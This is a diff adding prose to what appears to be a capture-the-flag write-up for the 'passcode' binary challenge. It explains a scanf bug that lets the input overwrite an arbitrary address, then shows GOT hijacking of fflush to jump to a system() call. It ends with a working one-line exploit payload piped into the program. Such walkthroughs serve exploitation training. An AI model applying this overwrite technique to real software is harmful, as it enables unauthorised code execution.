@@ -147,13 +147,63 @@ $1 = 96
 ```
 It's 96. 96 bytes. sweet. So seems like I can control the value of passcode1. But how do I control the value of passcode2??
 One point to note here is that in the original code `scanf("%100s", name);` only accepts 100 bytes only.
+
 hmmmm....
 
 Here I was out of my depths. So after researching on the internet, I found about GOT hijacking. GOT is global offset table. So basically when a C program is compiled into a binary, not all the functions are resolved. Especially the functions in shared libraries like printf, system(...), scanf() etc. It's linkers responsiblity to find them and once it finds them, then it places there address in the GOT. It works more like on-demand feature. When a function is required, linker will fetch it and place it's address in GOT and then if this function is required again, it'll be present there.
 If you didn't understand, what I am talking about I encourage you to read about it on wikipedia and other tons of articles and come back.
+
 Cool!
 
 How do we exploit this?
-If you note the scanf function of login function, we `&` is missing 
+If you note the scanf function of login function, we `&` is missing. Normaly scanf takes the value from `stdin` and the put the value at the address of variable(in the second argument of scanf). But this time, it will take the value from `stdin` and put the value into the address pointed to by value of passcode1.
+
+Let's summarise what we have learnt till now:
+- we could influence the value of passcode1.
+- we could overrite the value of the address pointed by value of passcode1.
+
+If you would have run the program and given the input to passcode1, you would have noticed that program crashed(or core dumped). That is because passcode1 had a junk value. That value didn't wasn't mapped to any real address. So the plan for our exploit is we would give passcode1 a valid address as a 'junk' value and then overrite that address's value with our target value.
+
+Ok, if you understood how GOT works is you would realise that every function has their address stored in GOT. So even `fflush()` would have their entry in GOT and will system() function have. I feel we have something brewing up here. Let's see
+
+When fflush() is executed, program execution will got to GOT to find the address of fflush. it's not there, so the linker will go ahead and find the address and then put the value in it. What if put some address there before all this search and find takes place? seems interesting.
+
+let's disassemble login again for a sec
+
+```
+   0x0804858b <+39>:    mov    eax,ds:0x804a02c
+   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
+   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
+   0x08048598 <+52>:    mov    eax,0x8048786
+   0x0804859d <+57>:    mov    DWORD PTR [esp],eax
+   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
+   0x080485a5 <+65>:    mov    eax,0x8048783
+   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
+   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
+   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
+   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
+   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
+   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
+   0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
+   0x080485cc <+104>:   jne    0x80485f1 <login+141>
+   0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
+   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
+   0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
+   0x080485de <+122>:   call   0x8048450 <puts@plt>
+   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
+   0x080485ea <+134>:   call   0x8048460 <system@plt>
+```
+alright I think, in the GOT entry of fflush we would put the address `0x080485e3`(second from last). 
+
+When I was reading writeups, I was confused as to why not put address `0x080485ea` cuz that's where the call to `system` takes place. But the thing it loads the arguments to `system` function at the address `0x080485ea`. That's why we put that address in the fflush.
+
+Cool! 
+
+Let's begin our attack. Since passcode1 value is asked in decimal, 0x080485e3 is 134514147.
+
+(echo -ne "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x04\xa0\x04\x08134514147") | ./passcode
+
+
+this should give you the flag. yipee!
 
 # solution
